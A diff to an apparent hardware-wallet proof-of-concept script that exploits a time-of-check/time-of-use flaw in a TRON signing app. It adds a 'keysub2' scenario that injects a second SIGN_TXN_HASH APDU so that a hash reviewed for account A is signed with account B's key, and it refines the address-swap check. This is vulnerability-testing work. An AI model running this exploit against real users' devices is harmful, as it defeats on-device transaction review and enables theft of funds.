@@ -35,6 +35,19 @@ Scenarios
       Sign-by-hash review of hash H (account A) is on screen; a
       SIGN_PERSONAL_MESSAGE first-chunk for account B rewrites the shared
       transactionContext.bip32_path. Approving signs H with account B's key.
+      NOTE: the injected first-chunk answers synchronously (0x9000), which
+      consumes the HID transport's single reply slot, so the post-approval
+      signature is dropped and the host receives nothing. Use keysub2 to get a
+      receivable signature.
+
+  keysub2 (needs "Sign by hash" enabled in the app settings)
+      Like keysub, but injects a *deferred* SIGN_TXN_HASH for account B over
+      the same hash H instead of a personal-message first-chunk. Because the
+      injected APDU is approval-gated it sends no early reply, so exactly one
+      reply stays pending and approval flushes a single signature the host can
+      read and verify against B. The review redraws (account B's context), so
+      it is less stealthy than keysub but actually returns the substituted
+      signature.
 
 Usage
 -----
@@ -340,34 +353,52 @@ def run_addr(channel, dongle, path_a, path_b):
 
     post = approval_state["replies"]
     if not post:
-        # The device buffered the approval reply; pump the io loop to flush it.
+        # The confirmed reply is a deferred reply. If the synchronous injection
+        # consumed the transport slot it will not flush; pump once to check.
         post = flush_after_approval(channel)
-    elif not any(status == SW_OK and len(data) >= 65 for data, status in post):
-        # We got a reply, but not a signature yet; keep pumping in case the
-        # signature is still buffered behind the visible reply.
-        post.extend(flush_after_approval(channel))
     show_replies("post-approval reply", post)
 
-    replies = pre + post
-    if not replies:
-        print("\nInconclusive: the device sent no response at all.")
-        return
-    if all(status != SW_OK for _, status in replies):
-        sw = replies[-1][1]
-        print("\nSAFE-looking: no success reply (last SW=0x{:04x}); the "
-              "dispatcher likely rejected the interleaved APDU.".format(sw))
-        return
+    # A GET_PUBLIC_KEY response starts with a 1-byte pubkey length, then the
+    # key, then a 1-byte address length, then the base58 address. The flush
+    # pump returns 4-byte GET_APP_CONFIGURATION replies, so validate the shape
+    # before parsing instead of assuming every SW_OK reply is a pubkey.
+    def address_of(data):
+        try:
+            pk_len = data[0]
+            if len(data) < 2 + pk_len:
+                return None
+            addr_len = data[1 + pk_len]
+            if len(data) < 2 + pk_len + addr_len:
+                return None
+            return data[2 + pk_len:2 + pk_len + addr_len].decode("ascii")
+        except (IndexError, UnicodeDecodeError):
+            return None
 
-    addresses = [
-        parse_get_public_key(data)[1] for data, status in replies
-        if status == SW_OK
-    ]
-    print("\nAddress displayed for approval : {}".format(addr_a))
-    print("Addresses returned by device   : {}".format(", ".join(addresses)))
-    if addr_b in addresses and addr_a not in addresses:
-        print("\n*** VULNERABLE: confirmed A but received B's address. ***")
-    elif addr_a in addresses:
-        print("\nSAFE: the reviewed address (A) was returned.")
+    pre_addrs = [a for a in (address_of(d) for d, s in pre if s == SW_OK) if a]
+    post_addrs = [a for a in (address_of(d) for d, s in post if s == SW_OK) if a]
+    print("\nAddress displayed for approval  : {}".format(addr_a))
+    print("Injection (non-confirm) returned: {}".format(
+        ", ".join(pre_addrs) or "(none)"))
+    print("Confirmed flow returned         : {}".format(
+        ", ".join(post_addrs) or "(none)"))
+
+    # The swap is proven ONLY if the CONFIRMED (post-approval) reply returns B.
+    # B appearing in the pre-approval injection is just a normal non-confirm
+    # query and proves nothing on its own.
+    if addr_b in post_addrs and addr_a not in post_addrs:
+        print("\n*** VULNERABLE: confirmed A on screen, but the CONFIRMED reply "
+              "returned B's address. ***")
+    elif addr_a in post_addrs:
+        print("\nSAFE: the confirmed reply returned the reviewed address (A).")
+    elif not post_addrs:
+        print("\nInconclusive on hardware: the confirmed reply never came back "
+              "-- the deferred\nconfirmed reply was swallowed by the HID "
+              "transport (the synchronous injection\nconsumed the exchange "
+              "slot, same as keysub). B was seen only in the pre-approval\n"
+              "injection, which a non-confirm query returns regardless, so the "
+              "swap is NOT\ndemonstrated here. Use the Speculos test "
+              "(test_toctou_address_verification_swap)\nfor the receivable "
+              "proof.")
     else:
         print("\nInconclusive: unexpected address(es) returned.")
 
@@ -449,7 +480,96 @@ def run_keysub(channel, dongle, path_a, path_b, inject=True):
         print("\nInconclusive: unexpected signer.")
 
 
-SCENARIOS = {"addr": run_addr, "keysub": run_keysub}
+def run_keysub2(channel, dongle, path_a, path_b):
+    """Signing-key substitution via a *deferred* injection.
+
+    Unlike ``keysub`` (which injects a SIGN_PERSONAL_MESSAGE first-chunk that
+    answers synchronously with 0x9000), this variant injects a second
+    SIGN_TXN_HASH for account B over the *same* hash H. That APDU is
+    approval-gated too, so it returns no immediate reply: it only overwrites the
+    shared ``transactionContext`` (bip32_path -> B) and restarts the review.
+
+    Why this matters: the HID transport carries a single outstanding exchange.
+    The synchronous 0x9000 in ``keysub`` consumes that slot, so the eventual
+    signature has no exchange to attach to and is dropped (host sees nothing).
+    Here neither injected nor original APDU answers early, exactly one reply is
+    pending, and approval flushes exactly one signature -- which the host
+    receives and can verify against B.
+
+    Tradeoff: injecting SIGN_TXN_HASH re-runs ``ux_flow_display``, so the review
+    redraws (account B's context). It is less stealthy than the no-redraw
+    personal-message trick, but it yields a receivable, verifiable signature.
+    """
+    print("== Scenario: signing-key substitution via deferred SIGN_TXN_HASH ==")
+    print("   [Injects a second sign-by-hash (path B, same hash H). The review "
+          "redraws;\n   approval then flushes a single signature the host can "
+          "read and verify.]")
+    ref_pk_a, addr_a = query_reference_key(dongle, path_a)
+    ref_pk_b, addr_b = query_reference_key(dongle, path_b)
+    digest = hashlib.sha256(b"tron toctou hardware poc").digest()
+    print("  account A ({}): {}".format(path_a, addr_a))
+    print("  account B ({}): {}".format(path_b, addr_b))
+    print("  hash under review: {}".format(digest.hex()))
+
+    print("\nSending SIGN_TXN_HASH for account A...")
+    channel.send(sign_txn_hash_apdu(path_a, digest))
+    prompt("Check the device: it should be reviewing a transaction/hash for "
+           "account A.\n    Do NOT approve yet.")
+
+    print("Injecting SIGN_TXN_HASH for account B (same hash H)...")
+    channel.send(sign_txn_hash_apdu(path_b, digest))
+    # The injected APDU is approval-gated: it sends no immediate reply, it only
+    # overwrites transactionContext and restarts the review. So, unlike keysub,
+    # we do NOT expect a pre-approval 0x9000 here.
+    pre = channel.drain(quiet=3.0)
+    show_replies("pre-approval reply", pre)
+    if pre:
+        print("  (note: unexpected pre-approval reply; the injected "
+              "SIGN_TXN_HASH normally defers)")
+
+    approval_state = {"replies": [], "error": None}
+    approval_thread = threading.Thread(
+        target=wait_for_approval_reply,
+        args=(channel, approval_state),
+        daemon=True,
+    )
+    approval_thread.start()
+    prompt("The review now shows account B's context. APPROVE it on the "
+           "device.")
+    approval_thread.join(timeout=APPROVAL_REPLY_TIMEOUT + 5.0)
+    if approval_thread.is_alive():
+        print("\nInconclusive: no approval response was received.")
+        return
+    if approval_state["error"] is not None:
+        raise approval_state["error"]
+
+    post = approval_state["replies"]
+    if not post:
+        # The device buffered the approval reply; pump the io loop to flush it.
+        post = flush_after_approval(channel)
+    show_replies("post-approval reply", post)
+
+    replies = pre + post
+    signatures = [data for data, sw in replies if sw == SW_OK and len(data) >= 65]
+    if not signatures:
+        print("\nInconclusive: no signature was returned. Is 'Sign by hash' "
+              "enabled, and did you approve on the device?")
+        return
+
+    signer = recover_signer(digest, signatures[0])
+    signer_pk = signer.to_bytes().hex()
+    print("\nReviewed (originally A)  : {}".format(ref_pk_a.hex()[2:]))
+    print("Substituted signer (B)   : {}".format(ref_pk_b.hex()[2:]))
+    print("Actual signer of the hash: {}".format(signer_pk))
+    if signer_pk == ref_pk_b.hex()[2:]:
+        print("\n*** VULNERABLE: reviewed A's hash, signed with B's key. ***")
+    elif signer_pk == ref_pk_a.hex()[2:]:
+        print("\nSAFE: the hash was signed with the reviewed key.")
+    else:
+        print("\nInconclusive: unexpected signer.")
+
+
+SCENARIOS = {"addr": run_addr, "keysub": run_keysub, "keysub2": run_keysub2}
 
 
 def main():
